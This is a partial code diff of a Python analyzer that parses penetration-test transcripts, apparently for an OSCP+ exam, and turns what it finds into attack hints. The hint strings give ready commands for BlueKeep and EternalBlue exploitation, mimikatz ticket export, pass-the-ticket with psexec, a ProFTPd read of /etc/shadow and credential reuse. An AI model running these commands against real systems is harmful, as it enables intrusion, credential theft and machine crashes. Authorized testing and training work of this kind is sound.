+                                     f"{_sam_no}.<dom>; set LHOST <me>; "
+                                     f"run'"))
                 elif _OS_BLUEKEEP.search(_os_str):
                     report.add("HIGH", "RECON", path, _ln(_om),
                                f"EOL Windows on {_sam}: {_os_str[:60]}"
                                f" - BlueKeep RDP CVE-2019-0708 "
                                f"candidate",
-                               hint=(f"one-target quota + FRAGILE on "
-                                     f"default configs (needs precise"
-                                     f" hal.dll offsets): msfconsole "
-                                     f"-x 'use exploit/windows/rdp/"
-                                     f"cve_2019_0708_bluekeep_rce; "
-                                     f"set RHOSTS {_sam_no}.<dom>; "
-                                     f"check; run'  |  ONLY run "
-                                     f"check first - the RCE crashes"
-                                     f" the box ~50%"))
+                               # iter-311 (D1-08): `check` itself
+                               # counts as MSF use on that host.
+                               hint=(f"BlueKeep candidate - fingerprint"
+                                     f" passively (allowed everywhere):"
+                                     f" nmap --script rdp-ntlm-info,"
+                                     f"rdp-enum-encryption,"
+                                     f"rdp-vuln-ms12-020 -p3389 "
+                                     f"{_sam_no}.<dom>  |  exploitation"
+                                     f" is Metasploit-only (exploit/"
+                                     f"windows/rdp/"
+                                     f"cve_2019_0708_bluekeep_rce, "
+                                     f"fragile hal.dll offsets, ~50% "
+                                     f"BSOD) and even its `check` locks"
+                                     f" {_sam_no} as your ONE exam-wide"
+                                     f" MSF target - treat as last "
+                                     f"resort, never as a probe"))
                 else:
                     continue
                 if store is not None:
@@ -8048,7 +8164,9 @@ def _multiline_passes(path, report, store):
         r'-ExclusionPath\s+[\'"]?([^\r\n\'";,]{2,240})[\'"]?')
     if not filters.is_doc_file(path):
         _mp_seen = set()
-        for _mr in _MPPREF_READ.finditer(text[:65536]):
+        # iter-311 (D4-09): full text - PS transcripts are long and the
+        # Add-MpPreference drop zone is issued late.
+        for _mr in _MPPREF_READ.finditer(text):
             _paths_str = _mr.group(1)
             # iter-293 audit fix: skip when the brace value looks like
             # a JSON blob / PS hashtable (inner braces / quotes / square
@@ -8087,7 +8205,7 @@ def _multiline_passes(path, report, store):
                     store.add(Evidence(kind="defender_exclusion",
                                        source=path, line=_ln(_mr),
                                        meta={"path": _pth}))
-        for _ma in _MPPREF_ADD.finditer(text[:65536]):
+        for _ma in _MPPREF_ADD.finditer(text):
             _pth = _ma.group(1).strip().strip('"\'')
             if not _pth or _pth.lower() in _mp_seen:
                 continue
@@ -8125,7 +8243,7 @@ def _multiline_passes(path, report, store):
     #   User        WEB01\Administrator  Local
     #   Group       CORP\Domain Admins   ActiveDirectory
     _LOCALGROUP_HEADER = re.compile(
-        r'(?im)^\s*(?:Alias\s+name\s+Administrators|'
+        r'(?im)^[ \t]*(?:Alias\s+name\s+Administrators|'
         r'Members)\s*$')
     _PSGROUP_HEADER = re.compile(
         r'(?im)^ObjectClass\s+Name\s+PrincipalSource\s*$')
@@ -8139,7 +8257,10 @@ def _multiline_passes(path, report, store):
         r'\s+(?:Local|ActiveDirectory|MicrosoftAccount|AzureAD)\s*$')
     if not filters.is_doc_file(path):
         _admin_seen = set()
-        _lg_m = _LOCALGROUP_HEADER.search(text[:65536])
+        # iter-311 (D4-10): full-text header search - the member window
+        # is header-relative (4000 chars from _lg_m.end()) so the only
+        # thing the old cap did was hide a block past 64 KB.
+        _lg_m = _LOCALGROUP_HEADER.search(text)
         if _lg_m:
             # iter-299 audit fix: refactored scan-window logic.
             # 1. Find the `Members` header (may be same as _lg_m or a
@@ -8150,7 +8271,7 @@ def _multiline_passes(path, report, store):
             _after = text[_lg_m.end():_lg_m.end() + 4000]
             # Locate the Members-anchor line (may already be _lg_m's own
             # match if it was the bare-Members alternative).
-            _mems_hdr = re.search(r'(?im)^\s*Members\s*$', _after)
+            _mems_hdr = re.search(r'(?im)^[ \t]*Members\s*$', _after)
             _scan_start = _mems_hdr.end() if _mems_hdr else 0
             # Skip past optional dashes separator after Members header.
             _dash = re.match(r'\s*[\r\n]+(?:-{5,}\s*[\r\n]+)?',
@@ -8159,11 +8280,17 @@ def _multiline_passes(path, report, store):
                 _scan_start += _dash.end()
             _remainder = _after[_scan_start:]
             _stop = re.search(
-                r'(?im)^\s*The\s+command\s+completed', _remainder)
+                r'(?im)^[ \t]*The\s+command\s+completed', _remainder)
             _members_text = (_remainder[:_stop.start()] if _stop
                              else _remainder[:2000])
             for _mm in _MEMBER_LINE_NET.finditer(_members_text):
                 _member = _mm.group(1).strip()
+                # iter-311 (D4-H1): anchor each member to ITS OWN line.
+                # _members_text == text[_lg_m.end()+_scan_start : ...],
+                # so _mm.start() is relative to that absolute offset.
+                # Previously every member was reported at the header.
+                _row_abs = _lg_m.end() + _scan_start + _mm.start()
+                _row_line = text[:_row_abs].count("\n") + 1
                 if not _member or _member.startswith("-"):
                     continue
                 # Skip generic well-known accounts
@@ -8176,7 +8303,7 @@ def _multiline_passes(path, report, store):
                     continue
                 _admin_seen.add(_member.lower())
                 _member_sh = _member.replace("'", "'\\''")
-                report.add("MEDIUM", "RECON", path, _ln(_lg_m),
+                report.add("MEDIUM", "RECON", path, _row_line,
                            f"Local admin (net localgroup): {_member}"
                            f" - lateral-movement target",
                            hint=(f"if we hold {_member_sh}'s cred, "
@@ -8187,20 +8314,23 @@ def _multiline_passes(path, report, store):
                 if store is not None:
                     store.add(Evidence(kind="local_admin",
                                        user=_member,
-                                       source=path, line=_ln(_lg_m),
+                                       source=path, line=_row_line,
                                        meta={"format": "net_localgroup"}))
-        _ps_m = _PSGROUP_HEADER.search(text[:65536])
+        _ps_m = _PSGROUP_HEADER.search(text)
         if _ps_m:
             _after_ps = text[_ps_m.end():_ps_m.end() + 4000]
             for _pmm in _MEMBER_LINE_PS.finditer(_after_ps):
                 _member = _pmm.group(1).strip()
+                # iter-311 (D4-H2): per-row line (was the header line).
+                _row_abs = _ps_m.end() + _pmm.start()
+                _row_line = text[:_row_abs].count("\n") + 1
                 if _member.lower() in _admin_seen:
                     continue
                 if _member.lower().endswith("\\administrator"):
                     continue
                 _admin_seen.add(_member.lower())
                 _member_sh = _member.replace("'", "'\\''")
-                report.add("MEDIUM", "RECON", path, _ln(_ps_m),
+                report.add("MEDIUM", "RECON", path, _row_line,
                            f"Local admin (Get-LocalGroupMember): "
                            f"{_member} - lateral-movement target",
                            hint=(f"if we hold {_member_sh}'s cred, "
@@ -8211,7 +8341,7 @@ def _multiline_passes(path, report, store):
                 if store is not None:
                     store.add(Evidence(kind="local_admin",
                                        user=_member,
-                                       source=path, line=_ln(_ps_m),
+                                       source=path, line=_row_line,
                                        meta={"format": "get_localgroupmember"}))
 
     # iter-295: SharpChrome / SharpDPAPI credential decryption captured
@@ -8349,7 +8479,9 @@ def _multiline_passes(path, report, store):
         "KB5008380": "AD Zerologon CVE-2020-1472",
     }
     if not filters.is_doc_file(path):
-        _hf_hdr = _HOTFIX_HEADER.search(text[:65536])
+        # iter-311 (D4-11): full-text header search (window is
+        # header-relative, 8 KB).
+        _hf_hdr = _HOTFIX_HEADER.search(text)
         if _hf_hdr:
             # Consume the block until we hit a blank line + non-KB text,
             # bounded to 8 KB.
@@ -8425,7 +8557,9 @@ def _multiline_passes(path, report, store):
         # search's first-match. Chained bloodyAD invocations in the
         # same terminal buffer would otherwise attribute every reset
         # to the earliest `set password X` in the 500-char window.
-        for _pm in _BAD_PW_RESET.finditer(text[:65536]):
+        # iter-311 (D4-12): full text - these `[+]` success lines sit at
+        # the END of an AD attack chain, deep in the session log.
+        for _pm in _BAD_PW_RESET.finditer(text):
             _preceding = text[max(0, _pm.start() - 500):_pm.start()]
             _u_matches = re.findall(
                 r'(?i)set\s+password\s+([\w.\-$]{1,60})', _preceding)
@@ -8446,7 +8580,7 @@ def _multiline_passes(path, report, store):
                                    source=path, line=_ln(_pm),
                                    meta={"attack_type": "pw_reset"}))
         _kc_seen = set()
-        for _km in _BAD_KEYCRED.finditer(text[:65536]):
+        for _km in _BAD_KEYCRED.finditer(text):
             _target_dn = (_km.group(1) or "").strip()
             _cn_m = re.match(r'(?i)CN=([^,]{1,60})', _target_dn) if _target_dn else None
             _tgt = _cn_m.group(1) if _cn_m else "<target>"
@@ -8471,7 +8605,7 @@ def _multiline_passes(path, report, store):
                                    meta={"attack_type": "shadow_cred",
                                          "target_dn": _target_dn[:200]}))
         _dacl_seen = set()
-        for _dm in _BAD_DACL.finditer(text[:65536]):
+        for _dm in _BAD_DACL.finditer(text):
             _target_dn = _dm.group(1).strip()
             _cn_m = re.match(r'(?i)CN=([^,]{1,60})', _target_dn)
             _tgt = _cn_m.group(1) if _cn_m else _target_dn[:60]
@@ -8503,7 +8637,7 @@ def _multiline_passes(path, report, store):
         # victims in the same session emit distinct findings rather
         # than silently coalescing into one.
         _rbcd_seen = set()
-        for _rbcd_m in _BAD_RBCD.finditer(text[:65536]):
+        for _rbcd_m in _BAD_RBCD.finditer(text):
             _rbcd_line = _ln(_rbcd_m)
             if _rbcd_line in _rbcd_seen:
                 continue
@@ -8610,7 +8744,9 @@ def _multiline_passes(path, report, store):
         r'(?im)^\[([\w.\-]{2,80})\]\s*:\s*PS\s+[A-Za-z]:\\[^\r\n>]{0,120}>')
     if not filters.is_doc_file(path):
         _psr_seen = set()
-        for _rm in _PSREMOTE_PROMPT.finditer(text[:65536]):
+        # iter-311 (D4-14): full text - a second-hop Enter-PSSession
+        # after 64 KB of local work is the common AD-set pattern.
+        for _rm in _PSREMOTE_PROMPT.finditer(text):
             _host = _rm.group(1).strip().lower()
             if _host in _psr_seen:
                 continue
@@ -8676,7 +8812,10 @@ def _multiline_passes(path, report, store):
         r'[ \t]+([\w.\-]{1,60})\\([\w.\-$]{1,60})[ \t]*$')
     if not filters.is_doc_file(path):
         _loggedon_seen = set()
-        _pv_hdr = _PV_LOGGEDON_HEADER.search(text[:65536])
+        # iter-311 (D4-15): full-text header searches - all three
+        # windows are header-relative and rows already carry their own
+        # line numbers (iter-304), so widening is purely additive.
+        _pv_hdr = _PV_LOGGEDON_HEADER.search(text)
         if _pv_hdr:
             _after_pv = text[_pv_hdr.end():_pv_hdr.end() + 8192]
             # iter-304 audit-fix: anchor rows to their own line (not the
@@ -8720,7 +8859,7 @@ def _multiline_passes(path, report, store):
                                        domain=_dom,
                                        source=path, line=_row_line,
                                        meta={"source": "get-netloggedon"}))
-        _psl_hdr = _PSLOGGEDON_HEADER.search(text[:65536])
+        _psl_hdr = _PSLOGGEDON_HEADER.search(text)
         if _psl_hdr:
             _after_psl = text[_psl_hdr.end():_psl_hdr.end() + 4096]
             # Stop at next blank-line-followed-by-heading or another
@@ -8764,7 +8903,7 @@ def _multiline_passes(path, report, store):
         # missing the lateral pivot target.
         _psl_res = re.search(
             r'(?im)^Users\s+logged\s+on\s+via\s+resource\s+shares'
-            r'\s*:?\s*$', text[:65536])
+            r'\s*:?\s*$', text)
         if _psl_res:
             _after_res = text[_psl_res.end():_psl_res.end() + 4096]
             for _row in _PSLOGGEDON_ROW.finditer(_after_res[:2048]):
@@ -8928,26 +9067,28 @@ def _multiline_passes(path, report, store):
     # Cross-block bleed prevented by requiring all three markers
     # within a 2 KB window from the Action line.
     _RUBEUS_ASKTGT_HDR = re.compile(
-        r'(?im)^\s*\[\*\]\s*Action\s*:\s*Ask\s+TGT\s*$')
+        r'(?im)^[ \t]*\[\*\]\s*Action\s*:\s*Ask\s+TGT\s*$')
     _RUBEUS_ASKTGT_OK = re.compile(
-        r'(?im)^\s*\[\+\]\s*TGT\s+request\s+successful')
+        r'(?im)^[ \t]*\[\+\]\s*TGT\s+request\s+successful')
     _RUBEUS_ASKTGT_SVC = re.compile(
-        r'(?im)^\s*ServiceName\s*:\s*krbtgt/([\w.\-]{2,80})')
+        r'(?im)^[ \t]*ServiceName\s*:\s*krbtgt/([\w.\-]{2,80})')
     _RUBEUS_ASKTGT_USER = re.compile(
-        r'(?im)^\s*UserName\s*:\s*([\w.\-$]{1,60})')
+        r'(?im)^[ \t]*UserName\s*:\s*([\w.\-$]{1,60})')
     _RUBEUS_ASKTGT_HASH = re.compile(
-        r'(?im)^\s*\[\*\]\s*Using\s+(?:rc4_hmac|aes256_cts_hmac_sha1|'
+        r'(?im)^[ \t]*\[\*\]\s*Using\s+(?:rc4_hmac|aes256_cts_hmac_sha1|'
         r'aes128_cts_hmac_sha1|des_cbc_md5)\s+(?:hash|key)\s*:\s*'
         r'([a-fA-F0-9]{16,64})')
     if not filters.is_doc_file(path):
         _rubeus_seen = set()
-        for _rt in _RUBEUS_ASKTGT_HDR.finditer(text[:65536]):
+        # iter-311 (D4-16): full-text header scan - Rubeus output is
+        # multi-KB per ticket (base64 kirbi) and asktgt/s4u run late.
+        for _rt in _RUBEUS_ASKTGT_HDR.finditer(text):
             _raw_win = text[_rt.start():_rt.start() + 2048]
             # iter-309 audit-fix: cap the window at the next `Action:`
             # header so a truncated block N cannot pair its UserName
             # with block N+1's ServiceName / success line.
             _next_hdr = re.search(
-                r'(?im)^\s*\[\*\]\s*Action\s*:',
+                r'(?im)^[ \t]*\[\*\]\s*Action\s*:',
                 _raw_win[len(_rt.group(0)):])
             _win = (_raw_win[:len(_rt.group(0)) + _next_hdr.start()]
                     if _next_hdr else _raw_win)
@@ -9020,24 +9161,24 @@ def _multiline_passes(path, report, store):
     # Requiring both markers plus the final ServiceName means we only
     # fire on completed delegation abuse, not aborted attempts.
     _RUBEUS_S4U_HDR = re.compile(
-        r'(?im)^\s*\[\*\]\s*Action\s*:\s*S4U\s*$')
+        r'(?im)^[ \t]*\[\*\]\s*Action\s*:\s*S4U\s*$')
     _RUBEUS_S4U_SELF_OK = re.compile(
-        r'(?im)^\s*\[\+\]\s*S4U2self\s+success')
+        r'(?im)^[ \t]*\[\+\]\s*S4U2self\s+success')
     _RUBEUS_S4U_PROXY_OK = re.compile(
-        r'(?im)^\s*\[\+\]\s*S4U2proxy\s+success')
+        r'(?im)^[ \t]*\[\+\]\s*S4U2proxy\s+success')
     _RUBEUS_S4U_IMPERSONATE = re.compile(
-        r"(?im)^\s*\[\*\]\s*Impersonating\s+user\s+'([\w.\-$]{1,60})'"
+        r"(?im)^[ \t]*\[\*\]\s*Impersonating\s+user\s+'([\w.\-$]{1,60})'"
         r"\s+to\s+target\s+SPN\s+'([\w./\-]{3,120})'")
     if not filters.is_doc_file(path):
         _s4u_seen = set()
-        for _s4 in _RUBEUS_S4U_HDR.finditer(text[:65536]):
+        for _s4 in _RUBEUS_S4U_HDR.finditer(text):
             _raw_win = text[_s4.start():_s4.start() + 4096]
             # iter-309 audit-fix: cap window at next `Action:` header
             # to prevent a partial s4u block from pairing its
             # `Impersonating` line with the following block's
             # S4U2Self/Proxy success markers.
             _next_hdr = re.search(
-                r'(?im)^\s*\[\*\]\s*Action\s*:',
+                r'(?im)^[ \t]*\[\*\]\s*Action\s*:',
                 _raw_win[len(_s4.group(0)):])
             _win = (_raw_win[:len(_s4.group(0)) + _next_hdr.start()]
                     if _next_hdr else _raw_win)
@@ -9119,11 +9260,11 @@ def _multiline_passes(path, report, store):
     # banners, redis `client: Connected`, mqtt/postgres client
     # Connected lines all fire fake PIVOT HIGHs.
     _CHISEL_SERVER = re.compile(
-        r'(?im)^\s*\d{4}/\d{2}/\d{2}\s+\d{2}:\d{2}:\d{2}\s+'
+        r'(?im)^[ \t]*\d{4}/\d{2}/\d{2}\s+\d{2}:\d{2}:\d{2}\s+'
         r'server\s*:\s*Listening\s+on\s+'
         r'(https?://[^\s\r\n]{4,120})')
     _CHISEL_CLIENT = re.compile(
-        r'(?im)^\s*\d{4}/\d{2}/\d{2}\s+\d{2}:\d{2}:\d{2}\s+'
+        r'(?im)^[ \t]*\d{4}/\d{2}/\d{2}\s+\d{2}:\d{2}:\d{2}\s+'
         r'client\s*:\s*'
         r'(?:session#\d+\s*:\s*)?Connected(?:\s*\(Latency\s+\d+ms\))?')
     _LIGOLO_AGENT_JOIN = re.compile(
@@ -9133,15 +9274,17 @@ def _multiline_passes(path, report, store):
     # iter-309 audit-fix: ligolo listener requires INFO[N] prefix (Go
     # logrus format that ligolo-ng emits) to avoid nginx/socat FPs.
     _LIGOLO_LISTEN = re.compile(
-        r'(?im)^\s*INFO\[\s*\d+\s*\]\s+Listening\s+on\s+'
+        r'(?im)^[ \t]*INFO\[\s*\d+\s*\]\s+Listening\s+on\s+'
         r'([0-9.]{7,15}:\d{2,5})')
     _SSH_LFORWARD = re.compile(
         r'(?im)\bssh\s+(?:-\w+\s+)*(-[LRD])\s+'
         r'(\d{2,5}(?::[\w.\-]{2,80}:\d{2,5})?)\s+[^\r\n]{1,120}')
     if not filters.is_doc_file(path):
         _pivot_seen = set()
+        # iter-311 (D4-17): full text - chisel/ligolo logs grow over the
+        # session and .bash_history is commonly >64 KB.
         # Chisel server (attacker declares listener)
-        for _cs in _CHISEL_SERVER.finditer(text[:65536]):
+        for _cs in _CHISEL_SERVER.finditer(text):
             _url = _cs.group(1)
             _sig = ("chisel-srv", _url.lower())
             if _sig in _pivot_seen:
@@ -9168,7 +9311,7 @@ def _multiline_passes(path, report, store):
         # from redis/mqtt logs, and multiple Chisel Connected lines in
         # the same file are reconnect noise for the same session.
         _chisel_cli_emitted = False
-        for _cc in _CHISEL_CLIENT.finditer(text[:65536]):
+        for _cc in _CHISEL_CLIENT.finditer(text):
             if _chisel_cli_emitted:
                 break
             _chisel_cli_emitted = True
@@ -9190,7 +9333,7 @@ def _multiline_passes(path, report, store):
         # (regex was compiled but never used). Attacker-side ligolo
         # proxy startup emits `INFO[0000] Listening on 0.0.0.0:11601`.
         _ligolo_listen_emitted = False
-        for _ll in _LIGOLO_LISTEN.finditer(text[:65536]):
+        for _ll in _LIGOLO_LISTEN.finditer(text):
             if _ligolo_listen_emitted:
                 break
             _ligolo_listen_emitted = True
@@ -9211,7 +9354,7 @@ def _multiline_passes(path, report, store):
                                          "role": "proxy_listener",
                                          "endpoint": _endpoint}))
         # Ligolo-ng Agent joined (proxy side, most valuable)
-        for _lj in _LIGOLO_AGENT_JOIN.finditer(text[:65536]):
+        for _lj in _LIGOLO_AGENT_JOIN.finditer(text):
             _agent_name = _lj.group(1).strip()
             _agent_remote = _lj.group(2).strip()
             _sig = ("ligolo-join", _agent_name.lower())
@@ -9236,7 +9379,7 @@ def _multiline_passes(path, report, store):
                                          "role": "proxy",
                                          "agent_remote": _agent_remote}))
         # SSH port-forward flag captured (from history/logs)
-        for _sf in _SSH_LFORWARD.finditer(text[:65536]):
+        for _sf in _SSH_LFORWARD.finditer(text):
             _flag = _sf.group(1)
             _spec = _sf.group(2)
             _sig = ("ssh-fwd", _flag, _spec)
@@ -9296,7 +9439,9 @@ def _multiline_passes(path, report, store):
         r'[^\r\n]*?TCP4?\s*:\s*([\w.\-:]{3,80})\s*:\s*(\d{1,5})')
     if not filters.is_doc_file(path):
         _pivot2_seen = set()
-        for _np in _NETSH_PORTPROXY_LINE.finditer(text[:65536]):
+        # iter-311 (D4-18): full text - netsh portproxy is issued from
+        # an established shell, i.e. late in the transcript.
+        for _np in _NETSH_PORTPROXY_LINE.finditer(text):
             _line = _np.group(0)
             _lp_m = _NETSH_LP.search(_line)
             _cp_m = _NETSH_CP.search(_line)
@@ -9328,7 +9473,7 @@ def _multiline_passes(path, report, store):
                                          "listen_port": _lp,
                                          "connect_addr": _ca,
                                          "connect_port": _cp}))
-        for _sc in _SOCAT_LISTEN.finditer(text[:65536]):
+        for _sc in _SOCAT_LISTEN.finditer(text):
             _lp = _sc.group(1)
             _dst = _sc.group(2)
             _dp = _sc.group(3)
@@ -9413,17 +9558,22 @@ def _multiline_passes(path, report, store):
                     report.add("CRITICAL", "RECON", path, _ln(_um),
                                f"Unconstrained delegation on {_sam} "
                                f"(non-DC) - TGT harvest primitive",
+                               # iter-311 (D1-22): canonical [LAB-ONLY]
+                               # tag; dropped the misleading nxc "forces
+                               # auth" aside (it authenticates AS the
+                               # victim, it does not coerce the victim).
                                hint=(f"if compromised: mimikatz "
                                      f"sekurlsa::tickets /export  |  "
-                                     f"then force a target user "
-                                     f"(preferably a DA) to auth to "
-                                     f"{_sam_sh}: PetitPotam/PrinterBug"
-                                     f"/DFSCoerce are LAB-ONLY on exam"
-                                     f"; also cross-domain: `nxc smb "
-                                     f"{_sam_sh} -u <victim> -p <pw>` "
-                                     f"forces auth  |  captured TGT: "
-                                     f"Rubeus ptt /ticket:<b64> then "
-                                     f"impacket-psexec -k @<target-dc>"))
+                                     f"then a target user (preferably a "
+                                     f"DA) must auth to {_sam_sh}: "
+                                     f"[LAB-ONLY] PetitPotam / PrinterBug"
+                                     f" / DFSCoerce coercion "
+                                     f"(exam-forbidden)  |  exam-legal: "
+                                     f"wait for a DA logon/session on "
+                                     f"{_sam_sh}, or trigger one via an "
+                                     f"in-scope admin workflow; captured "
+                                     f"TGT: Rubeus ptt /ticket:<b64> then"
+                                     f" impacket-psexec -k @<target-dc>"))
                 if store is not None:
                     store.add(Evidence(kind="host", host=_sam,
                                        fact="unconstrained",
@@ -9554,7 +9704,9 @@ def _multiline_passes(path, report, store):
         r'(?i)Compressing\s+output\s+into\s+'
         r'(?P<zip>[\w./\\\-]{1,240}\.zip)')
     if not filters.is_doc_file(path):
-        _sh_m = _BH_SHARPHOUND_DONE.search(text[:65536])
+        # iter-311 (D4-19): full text - the completion marker is the
+        # LAST line of a verbose collector log.
+        _sh_m = _BH_SHARPHOUND_DONE.search(text)
         if _sh_m:
             report.add("HIGH", "RECON", path, _ln(_sh_m),
                        "SharpHound collection completed - AD graph "
@@ -9573,7 +9725,7 @@ def _multiline_passes(path, report, store):
                                    source=path, line=_ln(_sh_m),
                                    meta={"collector": "sharphound"}))
         _bh_seen = set()
-        for _bp_m in _BH_PYTHON_DONE.finditer(text[:65536]):
+        for _bp_m in _BH_PYTHON_DONE.finditer(text):
             _zip = _bp_m.group("zip")
             # Only real BloodHound zips have the bh-python timestamp
             # prefix or literal 'bloodhound' in the filename.
@@ -9618,9 +9770,11 @@ def _multiline_passes(path, report, store):
     _NET_ACC_MINLEN = re.compile(
         r'(?im)^Minimum\s+password\s+length\s*:\s*(\d+)\s*$')
     if not filters.is_doc_file(path):
-        _pol_m = _NET_ACC_LOCKOUT.search(text[:65536])
-        _win_m = _NET_ACC_LOCKOUT_WIN.search(text[:65536])
-        _len_m = _NET_ACC_MINLEN.search(text[:65536])
+        # iter-311 (D4-20): full text - the lockout threshold decides
+        # whether a spray is exam-safe; it usually trails enumeration.
+        _pol_m = _NET_ACC_LOCKOUT.search(text)
+        _win_m = _NET_ACC_LOCKOUT_WIN.search(text)
+        _len_m = _NET_ACC_MINLEN.search(text)
         # Fire only when at least the lockout-threshold value appears
         # (that's the OSCP+ operator's primary decision input).
         if _pol_m:
@@ -9772,7 +9926,7 @@ def _multiline_passes(path, report, store):
     # iter-18: LSA secret `[*] _SC_<service>` cleartext service-account password
     # (impacket secretsdump.py LSASecrets output)
     _LSA_SC = re.compile(
-        r'(?im)^\s*\[\*\]\s*_SC_(\S+)\s*\r?\n'
+        r'(?im)^[ \t]*\[\*\]\s*_SC_(\S+)\s*\r?\n'
         r'\s*(?:\(Unknown User\)|([^\s:\\]+(?:\\[^\s:\\]+)?)):([^\r\n]{3,200})\s*$')
     for m in _LSA_SC.finditer(text):
         if filters.is_doc_file(path):
@@ -9951,16 +10105,23 @@ def _multiline_passes(path, report, store):
             r'(?:\|[^\r\n]*\r?\n){0,15}?\|[^\r\n]*\bState\s*:\s*VULNERABLE\b')
         for m in _NMAP_SMB_VULN.finditer(text):
             script_id = m.group(1)
+            # iter-311 (D1-09): manual PoC first, and the MSF module is
+            # named per script id (the old text hard-coded EternalBlue
+            # for every smb-vuln-* hit, incl. SambaCry).
             report.add("CRITICAL", "RECON", path, _ln(m),
                        f"nmap {script_id}: VULNERABLE",
-                       hint=("OSCP+ allows manual single-target Metasploit: "
-                             "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; "
-                             "set RHOSTS <ip>; set LHOST <you>; run'  OR  public PoC: "
-                             "worawit/MS17-010 send_and_execute.py <ip> <smbexe>"))
+                       hint=(f"manual PoC first (quota-free): searchsploit "
+                             f"--nmap <this-file> / searchsploit {script_id}; "
+                             f"for ms17-010: worawit/MS17-010 "
+                             f"send_and_execute.py <ip> <payload.exe> or "
+                             f"AutoBlue-MS17-010  |  Metasploit module for "
+                             f"{script_id} ONLY if <ip> is your ONE exam-wide "
+                             f"MSF target (locked on first use, failed run = "
+                             f"no second target)"))
 
         # iter-17: ProFTPd mod_copy CPFR/CPTO (CVE-2015-3306, HTB Kenobi)
         _PROFTPD = re.compile(
-            r'(?im)^\s*(?:ftp>\s+)?SITE\s+CPFR\s+(/\S+)[\s\S]{0,400}?'
+            r'(?im)^[ \t]*(?:ftp>\s+)?SITE\s+CPFR\s+(/\S+)[\s\S]{0,400}?'
             r'^\s*(?:ftp>\s+)?SITE\s+CPTO\s+(/\S+)')
         for m in _PROFTPD.finditer(text):
             src_p, dst_p = m.group(1), m.group(2)
@@ -9969,6 +10130,10 @@ def _multiline_passes(path, report, store):
                        hint=("CVE-2015-3306 pre-auth arb-file-read: "
                              "curl -s ftp://anonymous@<ip>/ --quote 'SITE CPFR /etc/shadow' "
                              "--quote 'SITE CPTO /var/tmp/x'; then GET /var/tmp/x via FTP/HTTP"))
+
+    # iter-311: the `whoami /priv` table detector lives in analyzers/privesc.py
+    # (_pass_token_privs, all Se*Privilege rows, category PRIVESC). A duplicate
+    # SeImpersonate-only copy here was removed during reconciliation.
 
     # iter-11: Pidgin accounts.xml plaintext password block (multi-line XML)
     _PIDGIN = re.compile(
@@ -9984,6 +10149,16 @@ def _multiline_passes(path, report, store):
         if store is not None:
             store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                                source=path, line=_ln(m)))
+
+
+# iter-311: per-line privilege markers that defer to analyzers/privesc.py's
+# structured whoami /priv + winPEAS parser when the file carries a table.
+_PRIV_MARKER_NAMES = frozenset({
+    "token impersonation", "SeBackupPrivilege", "SeRestorePrivilege",
+    "SeTakeOwnershipPrivilege", "SeLoadDriverPrivilege",
+    "SeManageVolumePrivilege", "SeDebugPrivilege", "SeCreateTokenPrivilege",
+    "SeTcbPrivilege",
+})
 
 
 def analyze(path, report, store=None):
@@ -10009,6 +10184,24 @@ def analyze(path, report, store=None):
     # notes, walkthroughs), keep the generous cap.
     _cred_cap_this_file = 5 if _is_log_file else 40
     _cred_emit_ct = 0
+    # iter-311 dedupe: analyzers/privesc.py owns structured token-privilege
+    # tables (`whoami /priv` with its column header, or >=2 winPEAS
+    # `SeXPrivilege: SE_PRIVILEGE_*` rows). When such a table is present,
+    # the per-line Se*Privilege markers below stand down for table rows so
+    # one privilege isn't reported 2-3x; bare mentions still fall back to
+    # the markers. Uses privesc.py's own regexes so the two can't drift.
+    _priv_table_owned = False
+    _priv_row_rx = None
+    try:
+        from analyzers import privesc as _pv
+        _pt = filters.read_text(path, max_bytes=4 * 1024 * 1024) or ""
+        if (_pv._PV_WHOAMI_HDR.search(_pt)
+                or len(_pv._PV_WINPEAS_PRIV.findall(_pt)) >= 2):
+            _priv_table_owned = True
+            _priv_row_rx = (_pv._PV_WHOAMI_ROW, _pv._PV_WINPEAS_PRIV)
+        del _pt
+    except Exception:
+        _priv_table_owned = False
     try:
         with open(path, "r", errors="ignore") as f:
             for lineno, line in enumerate(f, 1):
@@ -10472,13 +10665,20 @@ def analyze(path, report, store=None):
                         # detect flavor: PostgreSQL, MySQL/MariaDB
                         is_pg = "WITH PASSWORD" in line.upper()
                         _db = "postgres" if is_pg else "mysql"
+                        # iter-311 (D1-15): real client invocation per
+                        # flavour (old form was a dead conditional that
+                        # emitted `postgres -u ... -p` / a password-less
+                        # mysql prompt).
                         report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                    f"SQL CREATE USER: {u}:{pw}",
-                                   hint=(f"{_db} -u '{_u_sh_cu}' -p"
-                                         f"{'' if not is_pg else ''}"
-                                         f"  |  reuse as OS/service cred: "
-                                         f"nxc smb <host> -u '{_u_sh_cu}' "
-                                         f"-p '{_pw_sh_cu}'"))
+                                   hint=((f"PGPASSWORD='{_pw_sh_cu}' psql -U "
+                                          f"'{_u_sh_cu}' -h <pg-host> -d postgres"
+                                          if is_pg else
+                                          f"mysql -h <host> -u '{_u_sh_cu}' "
+                                          f"-p'{_pw_sh_cu}'")
+                                         + f"  |  reuse as OS/service cred: "
+                                           f"nxc smb <host> -u '{_u_sh_cu}' "
+                                           f"-p '{_pw_sh_cu}'"))
                         if store is not None:
                             from analyzers.ingest.evidence import Evidence
                             store.add(Evidence(kind="plaintext", user=u,
@@ -10498,14 +10698,23 @@ def analyze(path, report, store=None):
                             prefix = "SG"
                         elif tok.startswith("github_pat_"):
                             prefix = "gi"
+                        # iter-311 (D1-25): live-SaaS validation is an
+                        # out-of-scope action on the exam - every entry
+                        # that names a third-party API carries the same
+                        # "intel only on the exam" caveat the OpenAI
+                        # entry already had.
                         _PROVIDER_HINTS_LINE = {
                             "gh": ("GitHub PAT",
-                                   "gh api /user OR curl -H "
-                                   "'Authorization: token <tok>' "
-                                   "https://api.github.com/user"),
+                                   "intel only on the exam (api.github.com "
+                                   "is out of scope); real engagement: gh "
+                                   "api /user OR curl -H 'Authorization: "
+                                   "token <tok>' https://api.github.com/user"),
                             "gl": ("GitLab PAT",
-                                   "curl -H 'PRIVATE-TOKEN: <tok>' "
-                                   "https://gitlab.example/api/v4/user"),
+                                   "if the GitLab instance is an in-scope "
+                                   "target: curl -H 'PRIVATE-TOKEN: <tok>' "
+                                   "http://<gitlab-host>/api/v4/user then "
+                                   "/api/v4/projects for repo loot; "
+                                   "gitlab.com = intel only on the exam"),
                             "sk": ("OpenAI API key",
                                    "billing risk; flag as intel, do NOT "
                                    "hit live endpoint on exam"),
